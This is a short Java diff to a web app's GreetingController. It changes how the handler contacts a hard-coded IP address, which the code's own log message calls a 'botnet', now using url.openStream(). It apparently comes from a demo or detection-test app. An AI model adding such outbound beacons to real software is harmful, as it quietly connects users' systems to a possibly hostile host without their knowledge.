@@ -32,10 +32,13 @@ public class GreetingController {
 		model.addAttribute("botnet", botnet);
 		URL url;
 		try {
-			url = new URL("http://1.123.37.68:80");
-			HttpURLConnection con = (HttpURLConnection) url.openConnection();
-			con.setRequestMethod("GET");
 			System.out.println("Sending request to botnet");
+			url = new URL("http://1.123.37.68:80");
+			// HttpURLConnection con = (HttpURLConnection) url.openConnection();
+			// con.setRequestMethod("GET");
+			url.openStream();
+			// int responseCode = con.getResponseCode();
+			// System.out.println("GET Response Code :: " + responseCode);
 		} catch (Exception e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
